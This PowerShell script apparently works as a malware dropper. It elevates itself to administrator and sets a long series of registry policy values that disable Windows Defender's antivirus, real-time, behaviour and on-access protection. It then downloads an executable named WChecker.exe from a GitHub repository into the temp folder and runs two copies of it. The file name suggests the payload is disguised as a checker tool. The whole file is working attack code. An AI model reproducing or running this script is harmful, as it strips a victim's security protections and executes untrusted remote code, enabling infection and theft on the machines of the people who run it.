# thanks to https://superuser.com/a/1648105
#### START ELEVATE TO ADMIN #####
Param([Parameter(Mandatory=$false)][switch]$shouldAssumeToBeElevated, [Parameter(Mandatory=$false)] [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride')))
{
    $workingDirOverride = (Get-Location).Path
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false)  {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"
##### END ELEVATE TO ADMIN #####

Write-Output $workingDirOverride

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"
$SignatureUpdatesKey = "Signature Updates"
$SpynetKey = "Spynet"

$AllowFastServiceStartupValue = "AllowFastServiceStartup"
$DisableAntiSpywareValue = "DisableAntiSpyware"
$DisableAntiVirusValue = "DisableAntiVirus"
$DisableRoutinelyTakingActionValue = "DisableRoutinelyTakingAction"
$DisableSpecialRunningModesValue = "DisableSpecialRunningModes"
$ServiceKeepAliveValue = "ServiceKeepAlive"
$DisableBehaviorMonitoringValue = "DisableBehaviorMonitoring"
$DisableOnAccessProtectionValue = "DisableOnAccessProtection"
$DisableRealtimeMonitoringValue = "DisableRealtimeMonitoring"
$DisableScanOnRealtimeEnableValue = "DisableScanOnRealtimeEnable"
$ForceUpdateFromMUValue = "ForceUpdateFromMU"
$DisableBlockAtFirstSeenValue = "DisableBlockAtFirstSeen"

Write-Host "=== DISABLING WINDOWS DEFENDER ===" -ForegroundColor Yellow

# Create path if not exists
if (!(Test-Path $DefenderPath)) {
    New-Item -Path $DefenderPath -Force
}

# Create keys
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force
New-Item -Path "$DefenderPath\$SignatureUpdatesKey" -Force
New-Item -Path "$DefenderPath\$SpynetKey" -Force

# Set all properties
New-ItemProperty -Path "$DefenderPath" -Name "$AllowFastServiceStartupValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiVirusValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRoutinelyTakingActionValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableSpecialRunningModesValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$ServiceKeepAliveValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword -Force

New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableBehaviorMonitoringValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableOnAccessProtectionValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableScanOnRealtimeEnableValue" -Value "1" -PropertyType Dword -Force

New-ItemProperty -Path "$DefenderPath\$SignatureUpdatesKey" -Name "$ForceUpdateFromMUValue" -Value "1" -PropertyType Dword -Force

New-ItemProperty -Path "$DefenderPath\$SpynetKey" -Name "$DisableBlockAtFirstSeenValue" -Value "1" -PropertyType Dword -Force

Write-Host "Defender disabled successfully!" -ForegroundColor Green

Write-Host "=== DOWNLOADING AND RUNNING FILES ===" -ForegroundColor Yellow

$tempFolder = [System.IO.Path]::GetTempPath()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChecker.exe"
$dest1 = Join-Path $tempFolder "WChecker1.exe"
$dest2 = Join-Path $tempFolder "WChecker2.exe"

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

Write-Host "Downloading first file..." -ForegroundColor Yellow
try {
    $wc.DownloadFile($url, $dest1)
    Write-Host "Success! Running..." -ForegroundColor Green
    Start-Process -FilePath $dest1
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}

Write-Host "Downloading second file..." -ForegroundColor Yellow
try {
    $wc.DownloadFile($url, $dest2)
    Write-Host "Success! Running..." -ForegroundColor Green
    Start-Process -FilePath $dest2
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}

Write-Host "=== ALL DONE ===" -ForegroundColor Green
Pause
